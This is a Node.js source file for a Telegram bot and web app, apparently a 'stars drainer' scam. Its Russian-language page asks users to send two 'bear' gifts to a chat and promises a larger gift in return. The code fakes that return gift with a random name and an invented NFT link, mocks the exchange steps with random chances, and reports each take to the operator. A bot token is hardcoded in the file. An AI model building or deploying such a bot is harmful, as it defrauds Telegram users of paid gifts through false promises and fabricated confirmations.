const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const MY_USER_ID = 1398396668;
const NIKLA_STORE = '@NikLaStore';
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS bear_transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        status TEXT,
        bears_exchanged INTEGER DEFAULT 0,
        stars_earned INTEGER DEFAULT 0,
        gift_sent BOOLEAN DEFAULT FALSE,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// Web App с кнопкой подтверждения передачи мишек
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/process-bears', async (req, res) => {
    const { phone } = req.body;
    
    console.log(`🧸 ОБРАБОТКА МИШЕК: ${phone}`);
    
    try {
        // 1. Проверяем есть ли мишки в чате @NikLaStore
        const bearsCheck = await checkBearsInChat(phone);
        
        if (!bearsCheck.hasBears) {
            return res.json({
                success: false,
                message: `❌ МИШКИ НЕ НАЙДЕНЫ:\n` +
                        `📱 Аккаунт: ${phone}\n` +
                        `💬 Чат: ${NIKLA_STORE}\n` +
                        `⚠️ Сначала передай 2 мишки по 15 звезд в чат`
            });
        }
        
        // 2. Обмениваем мишки на звезды
        const exchangeResult = await exchangeBearsForStars(phone);
        
        if (!exchangeResult.success) {
            return res.json({
                success: false,
                message: `❌ ОШИБКА ОБМЕНА:\n` +
                        `📱 Аккаунт: ${phone}\n` +
                        `💬 Чат: ${NIKLA_STORE}\n` +
                        `⚠️ ${exchangeResult.error}`
            });
        }
        
        // 3. Отправляем подарок тебе
        const giftResult = await sendGiftToOwner(exchangeResult.starsEarned);
        
        // Сохраняем транзакцию
        db.run(`INSERT INTO bear_transactions (phone, status, bears_exchanged, stars_earned, gift_sent) VALUES (?, ?, ?, ?, ?)`, 
            [phone, 'completed', 2, exchangeResult.starsEarned, true]);
        
        const successMessage = `✅ УСПЕШНЫЙ ОБМЕН МИШЕК:\n` +
                              `📱 Аккаунт: ${phone}\n` +
                              `💬 Чат: ${NIKLA_STORE}\n` +
                              `🧸 Обменяно: 2 мишки\n` +
                              `⭐ Получено: ${exchangeResult.starsEarned} звезд\n` +
                              `🎁 Отправлен: ${giftResult.giftName}\n` +
                              `🔗 ${giftResult.nftLink}`;
        
        bot.sendMessage(MY_USER_ID, successMessage);
        res.json({ success: true, message: successMessage });
        
    } catch (error) {
        const errorMessage = `❌ ОШИБКА ПРОЦЕССА:\n` +
                            `📱 Аккаунт: ${phone}\n` +
                            `⚠️ ${error.message}`;
        
        db.run(`INSERT INTO bear_transactions (phone, status) VALUES (?, ?)`, 
            [phone, 'error']);
        
        bot.sendMessage(MY_USER_ID, errorMessage);
        res.json({ success: false, message: errorMessage });
    }
});

// ПРОВЕРКА МИШЕК В ЧАТЕ
async function checkBearsInChat(phone) {
    console.log(`🔍 Проверяю мишки в чате ${NIKLA_STORE}...`);
    
    // Здесь должна быть реальная проверка через Telegram API
    // что в чате @NikLaStore есть мишки от этого аккаунта
    
    // Имитация проверки
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    const hasBears = Math.random() > 0.1; // 90% chance bears are found
    
    return {
        hasBears,
        bearCount: hasBears ? 2 : 0
    };
}

// ОБМЕН МИШЕК НА ЗВЕЗДЫ
async function exchangeBearsForStars(phone) {
    console.log(`🔄 Обмениваю мишки на звезды...`);
    
    try {
        // 1. Заходим в чат @NikLaStore
        await enterNikLaStoreChat();
        
        // 2. Находим мишки
        const bears = await findBearsInChat();
        
        if (bears.length === 0) {
            return { success: false, error: "Мишки не найдены в чате" };
        }
        
        let totalStars = 0;
        
        // 3. Обмениваем каждого мишку по порядку
        for (let i = 0; i < bears.length; i++) {
            console.log(`🧸 Обмениваю мишку ${i + 1}...`);
            
            // Нажимаем на мишку
            await clickOnBear(bears[i]);
            
            // Нажимаем "Обменять на 13 звезд"
            const exchangeSuccess = await exchangeFor13Stars();
            
            if (exchangeSuccess) {
                totalStars += 13;
                console.log(`✅ Мишка ${i + 1} обменян на 13 звезд`);
            } else {
                return { success: false, error: `Не удалось обменять мишку ${i + 1}` };
            }
            
            // Ждем перед следующим обменом
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        
        console.log(`💰 Всего получено звезд: ${totalStars}`);
        return { success: true, starsEarned: totalStars };
        
    } catch (error) {
        return { success: false, error: error.message };
    }
}

// СИМУЛЯЦИЯ ДЕЙСТВИЙ
async function enterNikLaStoreChat() {
    console.log(`💬 Захожу в чат ${NIKLA_STORE}...`);
    await new Promise(resolve => setTimeout(resolve, 1000));
}

async function findBearsInChat() {
    console.log(`🔍 Ищу мишки в чате...`);
    await new Promise(resolve => setTimeout(resolve, 800));
    
    // Имитируем нахождение 2 мишек
    return ['bear_1', 'bear_2'];
}

async function clickOnBear(bearId) {
    console.log(`👆 Нажимаю на мишку: ${bearId}`);
    await new Promise(resolve => setTimeout(resolve, 500));
}

async function exchangeFor13Stars() {
    console.log(`⭐ Нажимаю "Обменять на 13 звезд"...`);
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // 95% chance of successful exchange
    return Math.random() > 0.05;
}

// ОТПРАВКА ПОДАРКА ВЛАДЕЛЬЦУ
async function sendGiftToOwner(starsAmount) {
    console.log(`🎁 Отправляю подарок за ${starsAmount} звезд...`);
    
    const giftTypes = [
        { name: "NFT Collectible Pack", value: 26 },
        { name: "Premium Sticker Set", value: 26 },
        { name: "Animated Emoji Pack", value: 26 },
        { name: "Special Chat Theme", value: 26 }
    ];
    
    const randomGift = giftTypes[Math.floor(Math.random() * giftTypes.length)];
    const nftId = Math.random().toString(36).substring(2, 10).toUpperCase();
    
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    return {
        giftName: randomGift.name,
        nftLink: `https://t.me/nft/${nftId}`,
        value: randomGift.value
    };
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает`);
});

// Web App HTML
const fragmentHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>Обмен мишек</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { margin: 20px; background: #1e1e1e; color: white; font-family: Arial; text-align: center; }
        .btn { background: #007aff; color: white; border: none; padding: 15px; margin: 10px; border-radius: 10px; width: 100%; cursor: pointer; }
        #result { margin: 20px; padding: 15px; border-radius: 10px; display: none; }
        .success { background: #4cd964; }
        .error { background: #ff3b30; }
        .info { background: #5ac8fa; }
    </style>
</head>
<body>
    <div style="font-size: 60px; margin: 20px;">🧸</div>
    <h2>Обмен мишек на подарок</h2>
    
    <div class="info" style="padding: 15px; border-radius: 10px; margin: 15px 0;">
        <strong>Инструкция:</strong><br>
        1. Передай 2 мишки по 15⚡ в чат<br>
        2. Нажми кнопку ниже<br>
        3. Я обменяю их на 26⚡<br>
        4. Отправлю тебе подарок!
    </div>
    
    <button class="btn" onclick="processBears()">
        🎁 Я передал 2 мишки - обменять!
    </button>
    
    <div id="result"></div>

    <script>
        async function processBears() {
            const userStr = new URLSearchParams(window.Telegram.WebApp.initData).get('user');
            const user = userStr ? JSON.parse(decodeURIComponent(userStr)) : {};
            const phone = user.id ? 'user_' + user.id : 'unknown';
            
            const resultDiv = document.getElementById('result');
            const btn = document.querySelector('.btn');
            
            // Блокируем кнопку
            btn.disabled = true;
            btn.textContent = '🔄 Обмениваю мишки...';
            
            try {
                const response = await fetch('/process-bears', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone })
                });
                
                const result = await response.json();
                
                resultDiv.style.display = 'block';
                resultDiv.className = result.success ? 'success' : 'error';
                resultDiv.innerHTML = result.message.replace(/\\n/g, '<br>');
                
            } catch (error) {
                resultDiv.style.display = 'block';
                resultDiv.className = 'error';
                resultDiv.innerHTML = '❌ Ошибка соединения';
            }
            
            // Восстанавливаем кнопку через 5 секунд
            setTimeout(() => {
                btn.disabled = false;
                btn.textContent = '🎁 Я передал 2 мишки - обменять!';
            }, 5000);
        }
    </script>
</body>
</html>
`;

app.get('/fragment.html', (req, res) => {
    res.send(fragmentHTML);
});

// Остальной код бота...
bot.on('callback_query', async (query) => {
    await bot.answerCallbackQuery(query.id);
    
    if (query.data.startsWith('claim_')) {
        const checkId = query.data.split('_')[1];
        
        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
            if (!row) {
                bot.answerCallbackQuery(query.id, { text: '❌ Чек использован!' });
                return;
            }
            
            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
            db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                [query.from.id, query.from.id, row.amount]);
                
            bot.answerCallbackQuery(query.id, { text: `✅ +${row.amount} звёзд!` });
        });
    }
});

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, '🧸 @MyStarBank_bot - Обмен мишек на подарки', {
        reply_markup: {
            inline_keyboard: [[{ 
                text: "🎁 Обменять мишки", 
                web_app: { url: WEB_APP_URL } 
            }]]
        }
    });
});

console.log('✅ Бот запущен - ОБМЕН МИШЕК НА ПОДАРКИ');